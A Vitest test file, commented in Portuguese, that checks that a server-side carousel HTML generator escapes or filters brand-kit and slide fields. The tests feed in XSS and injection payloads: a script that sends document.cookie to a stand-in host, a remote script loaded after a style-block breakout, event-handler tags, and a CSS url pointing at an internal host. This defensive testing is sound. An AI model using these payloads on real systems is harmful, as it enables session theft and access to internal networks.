import { describe, it, expect } from "vitest";
import { renderCarouselHTML } from "@/lib/endurance/marketing/carousel-html";
import type { SlideData, BrandKitData } from "@/lib/endurance/marketing/types";

/**
 * O HTML deste gerador não vai para o navegador do cliente: é carregado por um
 * Chromium headless NO SERVIDOR para virar PNG. Um script que entrasse aqui
 * executaria dentro do nosso processo, com acesso à rede interna — por isso o
 * escape não é detalhe de apresentação, é contenção.
 *
 * A auditoria encontrou o arquivo sem nenhuma função de escape: os campos de
 * texto do kit de marca chegavam apenas truncados em 60 caracteres, e 39 já
 * bastavam para fechar o bloco de estilo e abrir um <script>.
 */

const marca: BrandKitData = {
  primaryColor: "#6366F1",
  darkColor: "#312E81",
  lightColor: "#A5B4FC",
  lightBg: "#F8F7FF",
  darkBg: "#0F0E17",
  fontHeading: "Plus Jakarta Sans",
  fontBody: "Plus Jakarta Sans",
  logoText: "ENDURANCE",
  tagline: "gestão conectada",
  instagramHandle: "endurance",
} as BrandKitData;

const slide = (over: Partial<SlideData> = {}): SlideData =>
  ({
    index: 0,
    layout: "hero",
    background: "light",
    tag: "NOVIDADE",
    headline: "Título",
    body: "Texto",
    ...over,
  }) as SlideData;

/**
 * Uma asserção só, e a certa: o payload não pode aparecer com o "<" cru que o
 * torna markup. Nada além disso — as defesas são de dois tipos e produzem
 * saídas diferentes: texto de slide é ESCAPADO (vira entidade), enquanto nome
 * de fonte e handle são FILTRADOS (os caracteres somem). Exigir uma forma
 * escapada específica reprovaria a defesa mais forte das duas.
 *
 * Duas asserções erradas antes desta: "não contém <script>" (o documento tem
 * um script legítimo, o swipe do carrossel) e "não contém document.cookie"
 * (a string aparece como TEXTO escapado, que é exatamente o resultado
 * desejado). O que importa é uma coisa só: o payload não pode aparecer na
 * forma ATIVA, isto é, com o "<" cru que o torna markup.
 */
const naoExecuta = (html: string, payload: string) => {
  expect(html, "payload sobreviveu em forma ativa").not.toContain(payload);
};

describe("escape do HTML do carrossel", () => {
  it("não deixa passar script no texto do slide", () => {
    const html = renderCarouselHTML(
      [slide({ headline: "<script>fetch('http://x/'+document.cookie)</script>" })],
      marca,
    );
    naoExecuta(html, "<script>fetch('http://x/'+document.cookie)</script>");
  });

  it("não deixa passar HTML no corpo, na tag nem no CTA", () => {
    const html = renderCarouselHTML(
      [
        slide({
          layout: "cta",
          tag: "<img src=x onerror=alert(1)>",
          body: "<svg onload=alert(1)>",
          ctaText: "<b onmouseover=alert(1)>clique</b>",
        }),
      ],
      marca,
    );
    naoExecuta(html, "<img src=x onerror=alert(1)>");
    naoExecuta(html, "<svg onload=alert(1)>");
    naoExecuta(html, "<b onmouseover=alert(1)>clique</b>");
  });

  it("o nome da fonte não sai do bloco de estilo", () => {
    // Era o vetor mais curto: 39 caracteres bastavam.
    const html = renderCarouselHTML([slide()], {
      ...marca,
      fontHeading: "'}</style><script src=//x.co/a></script>",
    } as BrandKitData);
    naoExecuta(html, "</style><script src=//x.co/a></script>");
    // A fonte é FILTRADA, não escapada: sobra só letra, número e espaço.
    expect(html).not.toContain("x.co");
    expect(html).not.toContain("</style><script");
  });

  it("o handle do Instagram não injeta HTML", () => {
    const html = renderCarouselHTML([slide()], {
      ...marca,
      instagramHandle: '"><script>alert(1)</script>',
    } as BrandKitData);
    naoExecuta(html, '"><script>alert(1)</script>');
  });

  it("o nome da marca não injeta HTML", () => {
    const html = renderCarouselHTML([slide({ layout: "cta" })], {
      ...marca,
      logoText: "<script>alert(1)</script>",
    } as BrandKitData);
    naoExecuta(html, "<script>alert(1)</script>");
  });

  it("cor inválida cai no padrão em vez de entrar crua no CSS", () => {
    // A rota do kit valida hexadecimal, mas o gerador não pode depender disso:
    // um segundo caminho de escrita no banco reabriria o buraco.
    const html = renderCarouselHTML([slide()], {
      ...marca,
      primaryColor: "red;} body{background:url(http://interno/)} .x{",
    } as BrandKitData);
    expect(html).not.toContain("http://interno/");
    expect(html).toContain("#6366F1");
  });

  it("passos e tópicos também são escapados", () => {
    const html = renderCarouselHTML(
      [
        slide({
          layout: "steps",
          steps: [{ num: "<script>a</script>", title: "<b>t</b>", desc: "<i>d</i>" }],
        }),
        slide({
          index: 1,
          layout: "features",
          bullets: [{ icon: "<script>b</script>", label: "<b>l</b>", desc: "<i>x</i>" }],
        }),
      ] as SlideData[],
      marca,
    );
    for (const p of ["<script>a</script>", "<script>b</script>", "<b>t</b>", "<i>d</i>"])
      naoExecuta(html, p);
  });

  it("texto legítimo continua legível", () => {
    const html = renderCarouselHTML(
      [slide({ headline: "Gestão & operação", body: "Simples, direto" })],
      marca,
    );
    expect(html).toContain("Gest");
    expect(html).toContain("&amp;");
    expect(html).toContain("Simples, direto");
  });
});
